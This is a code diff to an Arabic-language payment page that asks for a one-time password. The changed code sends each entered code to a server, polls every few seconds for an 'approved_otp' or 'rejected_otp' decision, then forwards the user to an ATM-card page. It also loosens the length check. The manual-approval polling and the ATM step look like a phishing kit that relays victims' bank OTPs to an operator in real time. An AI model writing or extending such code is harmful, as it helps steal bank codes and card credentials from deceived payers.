@@ -294,28 +294,50 @@
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
         });
 
-        function submitOTP() {
+        const orderId = new URLSearchParams(window.location.search).get('orderId');
+
+        async function submitOTP() {
             const otpInput = document.getElementById('otpInput');
             const otp = otpInput.value.trim();
 
-            if (otp.length !== 6) {
-                showError('يرجى إدخال 6 أرقام');
+            if (otp.length < 4) {
+                showError('يرجى إدخال رمز صحيح');
                 return;
             }
 
-            // Save OTP to localStorage
-            const orders = JSON.parse(localStorage.getItem('orders') || '[]');
-            const order = orders.find(o => o.txnId === txnId);
-            
-            if (order) {
-                order.otp = otp;
-                order.otpStatus = 'pending';
-                order.currentPage = 'otp_loading';
-                localStorage.setItem('orders', JSON.stringify(orders));
-            }
+            const confirmBtn = document.getElementById('confirmBtn');
+            confirmBtn.disabled = true;
+            confirmBtn.textContent = 'جاري التحقق...';
 
-            // Redirect to OTP loading page
-            window.location.href = `payment_otp_loading_ar.html?txnId=${txnId}`;
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ orderId, otp })
+            });
+
+            checkStatus();
+        }
+
+        async function checkStatus() {
+            try {
+                const response = await fetch(`/api/check-status/${orderId}`);
+                const data = await response.json();
+
+                if (data.status === 'approved_otp') {
+                    window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
+                } else if (data.status === 'rejected_otp') {
+                    const confirmBtn = document.getElementById('confirmBtn');
+                    confirmBtn.disabled = false;
+                    confirmBtn.textContent = 'تأكيد الدفع';
+                    
+                    const input = document.getElementById('otpInput');
+                    input.style.borderColor = '#ef4444';
+                    input.style.background = '#fff5f5';
+                    showError(data.lastError || 'الرمز غير صحيح. يرجى المحاولة مرة أخرى.');
+                } else {
+                    setTimeout(checkStatus, 3000);
+                }
+            } catch (e) { console.error(e); }
         }
 
         function cancelPayment() {
